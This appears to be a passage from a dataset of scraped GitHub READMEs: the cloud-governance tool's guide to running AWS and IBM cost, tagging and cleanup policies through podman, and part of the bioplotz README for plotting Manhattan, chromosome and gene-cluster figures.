sudo podman run --rm --name cloud-governance -e policy=""ec2_run"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# select policy ['ec2_stop', 's3_inactive', 'empty_roles', 'ip_unattached', 'nat_gateway_unused', 'zombie_snapshots']
sudo podman run --rm --name cloud-governance -e policy=""policy"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes""  -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ebs_unattached
sudo podman run --rm --name cloud-governance -e policy=""ebs_unattached"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ebs_in_use
sudo podman run --rm --name cloud-governance -e policy=""ebs_in_use"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=zombie_cluster_resource
sudo podman run --rm --name cloud-governance -e policy=""zombie_cluster_resource"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e resource=""zombie_cluster_elastic_ip"" -e cluster_tag=""kubernetes.io/cluster/test-pd9qq"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=tag_resources
sudo podman run --rm --name cloud-governance -e policy=""tag_resources"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e tag_operation=""read/update/delete"" -e mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance""

# policy=tag_non_cluster
sudo podman run --rm --name cloud-governance -e policy=""tag_non_cluster"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e tag_operation=""read/update/delete"" -e mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance""

# policy=tag_iam_user
sudo podman run --rm --name cloud-governance -e policy=""tag_iam_user"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e user_tag_operation=""read/update/delete"" -e remove_tags=""['Environment', 'Test']"" -e username=""test_username"" -e file_name=""tag_user.csv""  -e log_level=""INFO"" -v ""/home/user/tag_user.csv"":""/tmp/tag_user.csv"" --privileged ""quay.io/ebattat/cloud-governance""

# policy=cost_explorer
sudo podman run --rm --name cloud-governance -e policy=""cost_explorer"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e es_host=""$elasticsearch_host"" -e es_port=""$elasticsearch_port"" -e es_index=""$elasticsearch_index"" -e cost_metric=UnblendedCost -e start_date=""$start_date"" -e end_date=""$end_date"" -e granularity=""DAILY"" -e cost_explorer_tags=""['User', 'Budget', 'Project', 'Manager', 'Owner', 'LaunchTime', 'Name', 'Email']"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""
sudo podman run --rm --name cloud-governance -e policy=""cost_explorer"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e es_index=""elasticsearch_index"" -e cost_metric=""UnblendedCost"" -e start_date=""$start_date"" -e end_date=""$end_date"" -e granularity=""DAILY"" -e cost_explorer_tags=""['User', 'Budget', 'Project', 'Manager', 'Owner', 'LaunchTime', 'Name', 'Email']"" -e file_name=""cost_explorer.txt"" -v ""/home/cost_explorer.txt"":""/tmp/cost_explorer.txt"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""

# policy=validate_iam_user_tags
sudo podman run --rm --name cloud-governance  -e policy=""validate_iam_user_tags"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e validate_type=""spaces/tags"" -e user_tags=""['Budget', 'User', 'Owner', 'Manager', 'Environment', 'Project']""   -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""

# policy=gitleaks
sudo podman run --rm --name cloud-governance -e policy=""gitleaks"" -e git_access_token=""$git_access_token"" -e git_repo=""https://github.com/redhat-performance/cloud-governance"" -e several_repos=""no"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# custom cloud custodian policy (path for custom policy: -v /home/user/custodian_policy:/custodian_policy)
sudo podman run --rm --name cloud-governance -e policy=""/custodian_policy/policy.yml"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" -v ""/home/user/custodian_policy"":""/custodian_policy"" --privileged ""quay.io/ebattat/cloud-governance""

```

## Run IBM Policy Using Podman

```sh
# policy=tag_baremetal
podman run --rm --name cloud-governance -e policy=""tag_baremetal"" -e account=""$account"" -e IBM_API_USERNAME=""$IBM_API_USERNAME"" -e IBM_API_KEY=""$IBM_API_KEY"" -e SPREADSHEET_ID=""$SPREADSHEET_ID"" -e GOOGLE_APPLICATION_CREDENTIALS=""$GOOGLE_APPLICATION_CREDENTIALS"" -v $GOOGLE_APPLICATION_CREDENTIALS:$GOOGLE_APPLICATION_CREDENTIALS -e LDAP_USER_HOST=""$LDAP_USER_HOST"" -e tag_operation=""update"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance:latest""

# tag=tab_vm
podman run --rm --name cloud-governance -e policy=""tag_vm"" -e account=""$account"" -e IBM_API_USERNAME=""$IBM_API_USERNAME"" -e IBM_API_KEY=""$IBM_API_KEY"" -e SPREADSHEET_ID=""$SPREADSHEET_ID"" -e GOOGLE_APPLICATION_CREDENTIALS=""$GOOGLE_APPLICATION_CREDENTIALS"" -v $GOOGLE_APPLICATION_CREDENTIALS:$GOOGLE_APPLICATION_CREDENTIALS -e LDAP_USER_HOST=""$LDAP_USER_HOST"" -e tag_operation=""update"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance:latest""

```

## Run Policy Using Pod

#### Run as a pod job via OpenShift

Job Pod: [cloud-governance.yaml](pod_yaml/cloud-governance.yaml)

Configmaps: [cloud_governance_configmap.yaml](pod_yaml/cloud_governance_configmap.yaml)

Quay.io Secret: [quayio_secret.sh](pod_yaml/quayio_secret.sh)

AWS Secret: [cloud_governance_secret.yaml](pod_yaml/cloud_governance_secret.yaml)

    * Need to convert secret key to base64 [run_base64.py](pod_yaml/run_base64.py)

## Pytest

##### Cloud-governance integration tests using pytest
```sh
python3 -m venv governance
source governance/bin/activate
(governance) $ python -m pip install --upgrade pip
(governance) $ pip install coverage
(governance) $ pip install pytest
(governance) $ git clone https://github.com/redhat-performance/cloud-governance
(governance) $ cd cloud-governance
(governance) $ coverage run -m pytest
(governance) $ deactivate
rm -rf *governance*
```

## Post Installation

#### Delete cloud-governance image
```sh
sudo podman rmi quay.io/ebattat/cloud-governance
```


","
[![PyPI Latest Release](https://img.shields.io/pypi/v/cloud-governance.svg)](https://pypi.org/project/cloud-governance/)
[![Container Repository on Quay](https://quay.io/repository/projectquay/quay/status ""Container Repository on Quay"")](https://quay.io/repository/ebattat/cloud-governance?tab=tags)
[![Actions Status](https://github.com/redhat-performance/cloud-governance/workflows/Build/badge.svg)](https://github.com/redhat-performance/cloud-governance/actions)
[![Coverage Status](https://coveralls.io/repos/github/redhat-performance/cloud-governance/badge.svg?branch=main)](https://coveralls.io/github/redhat-performance/cloud-governance?branch=main)
[![Documentation Status](https://readthedocs.org/projects/cloud-governance/badge/?version=latest)](https://cloud-governance.readthedocs.io/en/latest/?badge=latest)
[![python](https://img.shields.io/pypi/pyversions/cloud-governance.svg?color=%2334D058)](https://pypi.org/project/cloud-governance)
[![License](https://img.shields.io/pypi/l/cloud-governance.svg)](https://github.com/redhat-performance/cloud-governance/blob/main/LICENSE)


# Cloud Governance

![](images/cloud_governance.png)

## What is it?

**Cloud Governance** tool provides a lightweight and flexible framework for deploying cloud management policies focusing on cost optimize and security.

This tool support the following policies:
[policy](cloud_governance/policy)

[AWS Polices](cloud_governance/policy/aws)

* Real time Openshift Cluster cost, User cost
* [ec2_idle](cloud_governance/policy/aws/ec2_idle.py): idle ec2 in last 4 days, cpu < 2% & network < 5mb.
* [ec2_run](cloud_governance/policy/aws/ec2_run.py): running ec2.
* [ebs_unattached](cloud_governance/policy/aws/ebs_unattached.py): volumes that did not connect to instance, volume in available status.
* [ebs_in_use](cloud_governance/policy/aws/ebs_in_use.py): in use volumes.
* [tag_resources](cloud_governance/policy/policy_operations/aws/tag_cluster): Update cluster and non cluster resource tags fetching from the user tags or from the mandatory tags
* [zombie_cluster_resource](cloud_governance/policy/aws/zombie_cluster_resource.py): Delete cluster's zombie resources
* [tag_non_cluster](cloud_governance/policy/policy_operations/aws/tag_non_cluster): tag ec2 resources (instance, volume, ami, snapshot) by instance name
* [tag_iam_user](cloud_governance/policy/policy_operations/aws/tag_user): update the user tags from the csv file
* [cost_explorer](cloud_governance/policy/aws/cost_explorer.py): Get data from cost explorer and upload to ElasticSearch
* [ip_unattached](cloud_governance/policy/aws/ip_unattached.py): Get the unattached IP and delete it after 7 days.
* [s3_inactive](cloud_governance/policy/aws/s3_inactive.py): Get the inactive/empty buckets and delete them after 7 days.
* [empty_roles](cloud_governance/policy/aws/empty_roles.py): Get empty roles and delete it after 7 days.
* [zombie_snapshots](cloud_governance/policy/aws/zombie_snapshots.py): Get the zombie snapshots and delete it after 7 days.
* [nat_gateway_unused](cloud_governance/policy/aws/nat_gateway_unused.py): Get the unused nat gateways and deletes it after 7 days.
* gitleaks: scan Github repository git leak (security scan)  
* [cost_over_usage](cloud_governance/policy/aws/cost_over_usage.py): send mail to aws user if over usage cost

[IBM policies](cloud_governance/policy/ibm)

* [tag_baremetal](cloud_governance/policy/ibm/tag_baremetal.py): Tag IBM baremetal machines
* [tag_vm](cloud_governance/policy/ibm/tag_vm.py): Tga IBM Virtual Machines machines

** You can write your own policy using [Cloud-Custodian](https://cloudcustodian.io/docs/quickstart/index.html)
   and run it (see 'custom cloud custodian policy' in [Policy workflows](#policy-workloads)).


![](images/cloud_governance1.png)
![](images/demo.gif)

![](images/cloud_governance2.png)

Reference:
* The cloud-governance package is placed in [PyPi](https://pypi.org/project/cloud-governance/)
* The cloud-governance container image is placed in [Quay.io](https://quay.io/repository/ebattat/cloud-governance)
* The cloud-governance readthedocs link is [ReadTheDocs](https://cloud-governance.readthedocs.io/en/latest/)
![](images/cloud_governance3.png)

_**Table of Contents**_


- [Installation](#installation)
- [Configuration](#configuration)
- [Run AWS Policy Using Podman](#run-aws-policy-using-podman)
- [Run IBM Policy Using Podman](#run-ibm-policy-using-podman)
- [Run Policy Using Pod](#run-policy-using-pod)
- [Pytest](#pytest)
- [Post Installation](#post-installation)



## Installation

#### Download cloud-governance image from quay.io
```sh
# Need to run it with root privileges
sudo podman pull quay.io/ebattat/cloud-governance
```

#### Environment variables description:

(mandatory)AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID

(mandatory)AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY

##### Policy name:
(mandatory)policy=ec2_idle / ec2_run / ebs_unattached / ebs_in_use / tag_cluster_resource / zombie_cluster_resource / tag_ec2_resource

##### Policy logs output
(mandatory)policy_output=s3://redhat-cloud-governance/logs

##### Cluster or instance name:
(mandatory policy:tag_cluster_resource)resource_name=ocs-test

##### Cluster or instance tags:
(mandatory policy:tag_cluster_resource)mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}""

##### gitleaks
(mandatory policy: gitleaks)git_access_token=$git_access_token
(mandatory policy: gitleaks)git_repo=https://github.com/redhat-performance/cloud-governance
(optional policy: gitleaks)several_repos=yes/no (default = no)

##### Choose a specific region or all for all the regions, default : us-east-2
(optional)AWS_DEFAULT_REGION=us-east-2/all (default = us-east-2)

##### Choose dry run or not, default yes
(optional)dry_run=yes/no (default = yes)

##### Choose log level, default INFO
(optional)log_level=INFO (default = INFO)

#### LDAP hostname to fetch mail records
LDAP_HOST_NAME=ldap.example.com

#### Enable Google Drive API in console and create Service account
GOOGLE_APPLICATION_CREDENTIALS=$pwd/service_account.json

# Configuration

### AWS Configuration

#### Create a user and a bucket
* Create user with IAM [iam](iam/clouds)
* Create a logs bucket [create_bucket.sh](iam/cloud/aws/create_bucket.sh)

### IBM Configuration
* Create classic infrastructure API key

## Run AWS Policy Using Podman 
```sh
# policy=ec2_idle
sudo podman run --rm --name cloud-governance -e policy=""ec2_idle"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ec2_run
sudo podman run --rm --name cloud-governance -e policy=""ec2_run"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# select policy ['ec2_stop', 's3_inactive', 'empty_roles', 'ip_unattached', 'nat_gateway_unused', 'zombie_snapshots']
sudo podman run --rm --name cloud-governance -e policy=""policy"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes""  -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ebs_unattached
sudo podman run --rm --name cloud-governance -e policy=""ebs_unattached"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ebs_in_use
sudo podman run --rm --name cloud-governance -e policy=""ebs_in_use"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=zombie_cluster_resource
sudo podman run --rm --name cloud-governance -e policy=""zombie_cluster_resource"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e resource=""zombie_cluster_elastic_ip"" -e cluster_tag=""kubernetes.io/cluster/test-pd9qq"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=tag_resources
sudo podman run --rm --name cloud-governance -e policy=""tag_resources"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e tag_operation=""read/update/delete"" -e mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance""

# policy=tag_non_cluster
sudo podman run --rm --name cloud-governance -e policy=""tag_non_cluster"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e tag_operation=""read/update/delete"" -e mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance""

# policy=tag_iam_user
sudo podman run --rm --name cloud-governance -e policy=""tag_iam_user"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e user_tag_operation=""read/update/delete"" -e remove_tags=""['Environment', 'Test']"" -e username=""test_username"" -e file_name=""tag_user.csv""  -e log_level=""INFO"" -v ""/home/user/tag_user.csv"":""/tmp/tag_user.csv"" --privileged ""quay.io/ebattat/cloud-governance""

# policy=cost_explorer
sudo podman run --rm --name cloud-governance -e policy=""cost_explorer"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e es_host=""$elasticsearch_host"" -e es_port=""$elasticsearch_port"" -e es_index=""$elasticsearch_index"" -e cost_metric=UnblendedCost -e start_date=""$start_date"" -e end_date=""$end_date"" -e granularity=""DAILY"" -e cost_explorer_tags=""['User', 'Budget', 'Project', 'Manager', 'Owner', 'LaunchTime', 'Name', 'Email']"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""
sudo podman run --rm --name cloud-governance -e policy=""cost_explorer"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e es_index=""elasticsearch_index"" -e cost_metric=""UnblendedCost"" -e start_date=""$start_date"" -e end_date=""$end_date"" -e granularity=""DAILY"" -e cost_explorer_tags=""['User', 'Budget', 'Project', 'Manager', 'Owner', 'LaunchTime', 'Name', 'Email']"" -e file_name=""cost_explorer.txt"" -v ""/home/cost_explorer.txt"":""/tmp/cost_explorer.txt"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""

# policy=validate_iam_user_tags
sudo podman run --rm --name cloud-governance  -e policy=""validate_iam_user_tags"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e validate_type=""spaces/tags"" -e user_tags=""['Budget', 'User', 'Owner', 'Manager', 'Environment', 'Project']""   -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance:latest""

# policy=gitleaks
sudo podman run --rm --name cloud-governance -e policy=""gitleaks"" -e git_access_token=""$git_access_token"" -e git_repo=""https://github.com/redhat-performance/cloud-governance"" -e several_repos=""no"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# custom cloud custodian policy (path for custom policy: -v /home/user/custodian_policy:/custodian_policy)
sudo podman run --rm --name cloud-governance -e policy=""/custodian_policy/policy.yml"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" -v ""/home/user/custodian_policy"":""/custodian_policy"" --privileged ""quay.io/ebattat/cloud-governance""

```

## Run IBM Policy Using Podman

```sh
# policy=tag_baremetal
podman run --rm --name cloud-governance -e policy=""tag_baremetal"" -e account=""$account"" -e IBM_API_USERNAME=""$IBM_API_USERNAME"" -e IBM_API_KEY=""$IBM_API_KEY"" -e SPREADSHEET_ID=""$SPREADSHEET_ID"" -e GOOGLE_APPLICATION_CREDENTIALS=""$GOOGLE_APPLICATION_CREDENTIALS"" -v $GOOGLE_APPLICATION_CREDENTIALS:$GOOGLE_APPLICATION_CREDENTIALS -e LDAP_USER_HOST=""$LDAP_USER_HOST"" -e tag_operation=""update"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance:latest""

# tag=tab_vm
podman run --rm --name cloud-governance -e policy=""tag_vm"" -e account=""$account"" -e IBM_API_USERNAME=""$IBM_API_USERNAME"" -e IBM_API_KEY=""$IBM_API_KEY"" -e SPREADSHEET_ID=""$SPREADSHEET_ID"" -e GOOGLE_APPLICATION_CREDENTIALS=""$GOOGLE_APPLICATION_CREDENTIALS"" -v $GOOGLE_APPLICATION_CREDENTIALS:$GOOGLE_APPLICATION_CREDENTIALS -e LDAP_USER_HOST=""$LDAP_USER_HOST"" -e tag_operation=""update"" -e log_level=""INFO"" -v ""/etc/localtime"":""/etc/localtime"" ""quay.io/ebattat/cloud-governance:latest""

```

## Run Policy Using Pod

#### Run as a pod job via OpenShift

Job Pod: [cloud-governance.yaml](pod_yaml/cloud-governance.yaml)

Configmaps: [cloud_governance_configmap.yaml](pod_yaml/cloud_governance_configmap.yaml)

Quay.io Secret: [quayio_secret.sh](pod_yaml/quayio_secret.sh)

AWS Secret: [cloud_governance_secret.yaml](pod_yaml/cloud_governance_secret.yaml)

    * Need to convert secret key to base64 [run_base64.py](pod_yaml/run_base64.py)

## Pytest

##### Cloud-governance integration tests using pytest
```sh
python3 -m venv governance
source governance/bin/activate
(governance) $ python -m pip install --upgrade pip
(governance) $ pip install coverage
(governance) $ pip install pytest
(governance) $ git clone https://github.com/redhat-performance/cloud-governance
(governance) $ cd cloud-governance
(governance) $ coverage run -m pytest
(governance) $ deactivate
rm -rf *governance*
```

## Post Installation

#### Delete cloud-governance image
```sh
sudo podman rmi quay.io/ebattat/cloud-governance
```


",redhat-performance/cloud-governance
bioplotz,https://github.com/sc-zhang/bioplotz,0,12037,11344,"## Introduction

This is a package for plotting some images for bioinformatics.

## Dependencies
Python modules:  
&ensp;&ensp;&ensp;&ensp;numpy  
&ensp;&ensp;&ensp;&ensp;matplotlib  
&ensp;&ensp;&ensp;&ensp;pandas  

## Installation
```bash
pip install git+https://github.com/sc-zhang/bioplotz.git --user
```

## Usage

### Manhattan Plot

```python
import bioplotz as bp

fig, ax = bp.manhattan(data, threshold=0, color=['orange', 'green'], threshold_line_color='blue', log_base=0,
                       reverse=False, xtick_labels=True, ytick_labels=True, ax=None, marker='.', s=1, **kwargs)
```
| parameter                | value type    | explain                                                                                                                                                                                                                                                                                                                                                              |
|--------------------------|---------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **data**                 | dict<br>list  | **dict** key: block name<br>&ensp;&ensp;&ensp;&ensp;value: [[x1,x2,...,xn], [y1,y2,...,yn]]<br>**list** is a list like: [[x1,y1], [x2, y2], ..., [xn, yn]]                                                                                                                                                                                                           |
| **threshold**            | value<br>list | **value** if only one threshold line to plot, Notice: if log_base was set, threshold values should be calculated with same log_base manunally, if reverse is True, threshold values should be set to its opposite number<br>**list** if more than one threshold line need to plot, a list can be used for different lines, like: [threshold_value1, threshol_value2] |
| **color**                | list          | **color** is a list used for blocks, if the count of block greater than color count, it will be used circularly                                                                                                                                                                                                                                                      |
| **threshold_line_color** | value<br>list | **value** if **threshold** is a single value<br>**list** if **threshold** is a list                                                                                                                                                                                                                                                                                  |
| **threshold_line_width** | value         | **value** the line width of threshold lines                                                                                                                                                                                                                                                                                                                          |
| **block_line_width**     | value         | **value** if there are only one color, the block line will display as border, the width is set by this parameter                                                                                                                                                                                                                                                     |
| **log_base**             | value         | log_base = 0 means not calucate value with log<br>log_base != 0 means log base for log values with it                                                                                                                                                                                                                                                                |
| **reverse**              | Boolean       | if all data lower than 0, you may use it to show opposite values                                                                                                                                                                                                                                                                                                     |
| **other parameters**     | value         | same with parameters used in **pyplot.scatter**                                                                                                                                                                                                                                                                                                                      |

<table align=""center"">
<tr>
<td><img width=600 src=""https://github.com/sc-zhang/bioplotz/blob/master/examples/manhattan.png""></td>
</tr>
</table>

### Chromosome Plot

```python
import bioplotz as bp

fig, ax, clb = bp.chromosome(chr_len_db, bed_data, centro_pos, value_type=""numeric"", orientation=""vertical"", **kwargs)
```
| parameter            | value type                     | Optional | Default      | explain                                                                                                                                                                                                                                                                                                           |
|----------------------|--------------------------------|----------|--------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **chr_len_db**       | dict                           | No       | -            | **key**: chromosome name<br>**value**: chromosome length                                                                                                                                                                                                                                                          |
| **chr_order**        | list                           | Yes      | None         | **list**: the custom chromosome order, like: [""Chr1"", ""Chr3"", ""Chr2""]<br>must same with keys in chr_len                                                                                                                                                                                                           |
| **bed_data**         | list                           | Yes      | None         | **list**: two dimension list, like: [[chrome name, start pos, end pos, value/color]]                                                                                                                                                                                                                              |
| **centro_pos**       | dict                           | Yes      | None         | **key**: chromosome name<br>**value**: middle position of centromere                                                                                                                                                                                                                                              |
| **value_type**       | str                            | Yes      | numeric      | **numeric**: the 4th column of bed_data should be value<br>**color**: the 4th column of bed_data is color<br>**marker**: different with other two types, it need 5 columns, the 4th column of bed_data is marker, the 5th column is color (marker is same with the parameter which be used in **pyplot.scatter**) |
| **orientation**      | str                            | Yes      | vertical     | ""vertical"" or ""horizontal""                                                                                                                                                                                                                                                                                        |
| **cmap**             | str                            | Yes      | gist_rainbow | **cmap** for colorbar                                                                                                                                                                                                                                                                                             |
| **cmap_parts**       | int                            | Yes      | 100          | how many parts for splitting cmap                                                                                                                                                                                                                                                                                 |
| **s**                | float or array-like, shape(n,) | Yes      | None         | same with parameter s use in **pyplot.scatter**                                                                                                                                                                                                                                                                   |
| **other parameters** | value                          | Yes      | None         | same with parameters used in **pyplot.plot**                                                                                                                                                                                                                                                                      |

- If value_type is numeric, the return value clb will be colorbar, else None
<table align=""center"">
<tr>
<td><img width=500 height=270 src=""https://github.com/sc-zhang/bioplotz/blob/master/examples/chromosome.png""></td>
<td><img width=500 height=270 src=""https://github.com/sc-zhang/bioplotz/blob/master/examples/chromosome_h.png""></td>
</tr>
</table>

### Gene Cluster Plot

```python
import bioplotz as bp

fig, ax = bp.genecluster(gene_list)
```
| parameter     | value type  | Optional | Default | explain                                                                                                                                          |
|---------------|-------------|----------|---------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **gene_list** | list        | No       | -       | **list**: 2-dimension list, like [[gene name, start pos, end pos, direct(+/-), color], ..., [gene name, start pos, end pos, direct(+/-), color]] |
| **edgecolor** | list<br>str | Yes      | None    | **list**: same length with gene_list, like: [""green"", ""blue"", ..., ""red""]<br>**str**: common edge color for all genes                            |
| **edgewidth** | int         | Yes      | 1       | edge width for all genes                                                                                                                         |
| **lw**        | int         | Yes      | 3       | line width to show the genome backbone                                                                                                           |

**Notice**, the best figsize should be (gene count, 1), for example: plt.figure(figsize=(16, 1)), and the bbox_inches parameter which in savefig should be 'tight'.

<table align=""center"">
<tr>
<td><img width=600 src=""https://github.com/sc-zhang/bioplotz/blob/master/examples/genecluster.png""></td>
</tr>
</table>
","## Introduction

This is a package for plotting some images for bioinformatics.

## Dependencies
Python modules:  
    numpy  
    matplotlib  
    pandas  

## Installation
```bash
pip install git+https://github.com/sc-zhang/bioplotz.git --user
```

## Usage

### Manhattan Plot

```python
import bioplotz as bp

fig, ax = bp.manhattan(data, threshold=0, color=['orange', 'green'], threshold_line_color='blue', log_base=0,
                       reverse=False, xtick_labels=True, ytick_labels=True, ax=None, marker='.', s=1, **kwargs)
```
| parameter                | value type    | explain                                                                                                                                                                                                                                                                                                                                                              |
|--------------------------|---------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **data**                 | dictlist  | **dict** key: block name    value: [[x1,x2,...,xn], [y1,y2,...,yn]]**list** is a list like: [[x1,y1], [x2, y2], ..., [xn, yn]]                                                                                                                                                                                                           |
| **threshold**            | valuelist | **value** if only one threshold line to plot, Notice: if log_base was set, threshold values should be calculated with same log_base manunally, if reverse is True, threshold values should be set to its opposite number**list** if more than one threshold line need to plot, a list can be used for different lines, like: [threshold_value1, threshol_value2] |
